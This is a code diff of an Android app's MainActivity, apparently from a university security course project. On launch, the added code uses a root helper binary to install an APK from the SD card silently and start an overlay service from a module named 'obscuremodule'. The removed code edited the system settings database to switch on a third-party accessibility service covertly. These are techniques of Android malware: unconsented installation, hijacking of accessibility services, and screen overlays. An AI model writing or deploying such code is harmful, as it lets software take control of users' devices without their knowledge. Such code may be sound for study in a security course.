@@ -1,15 +1,10 @@
 package edu.bu.ec700.john.mainapp;
 
 import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
 import android.os.Bundle;
-import android.provider.Settings;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
-
-import java.io.File;
 
 public class MainActivity extends Activity {
 
@@ -18,36 +13,19 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        installModule();
+    }
+
+    public void installModule() {
         try{
-
-
-            Process su2 = Runtime.getRuntime().exec("/system/xbin/su2 pm install -r /sdcard/app-release.apk");
-            Log.v("app", "tried");
-
-            su2.waitFor();
-            Process su3 = Runtime.getRuntime().exec("/system/xbin/su2 /system/xbin/sqlite3 /data/data/com.android.providers.settings/databases/settings.db \"UPDATE secure SET value='edu.bu.ec700.john.testblockerapp/edu.bu.ec700.john.testblockerapp.MyAccessibilityService' WHERE name='enabled_accessibility_services'\"");
-            Log.v("app", "tried");
-            su3.waitFor();
-            Process su = Runtime.getRuntime().exec("/system/xbin/su2 /system/xbin/sqlite3 /data/data/com.android.providers.settings/databases/settings.db \"UPDATE secure SET value='1' WHERE name='accessibility_enabled'\"");
-            Log.v("app", "tried");
+            Process su = Runtime.getRuntime().exec("/system/xbin/su2 pm install -r /sdcard/app-release.apk");
             su.waitFor();
+            su = Runtime.getRuntime().exec("/system/xbin/su2 am startservice -n edu.bu.ec700.john.obscuremodule/edu.bu.ec700.john.obscuremodule.OverlayService");
+            su.waitFor();
+
         }catch(Exception e){
             Log.v("app", "ERR:" + e.toString());
-            Log.v("app", "ERR:" + e.getMessage());
-            Log.v("app", "ERR:" + e.getCause());
-
-        }//catch(InterruptedException e){
-        //    Log.v("app", "ERR" + e.toString());
-        //}
-        Settings.Secure.putString(getContentResolver(),
-                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, "edu.bu.ec700.john.testblockerapp/MyAccessibilityService");
-        Settings.Secure.putString(getContentResolver(),
-                Settings.Secure.ACCESSIBILITY_ENABLED, "1");
-
-        File file = new File("/sdcard/", "app-release.apk");
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
-        //startActivity(intent);
+        }
     }
 
 
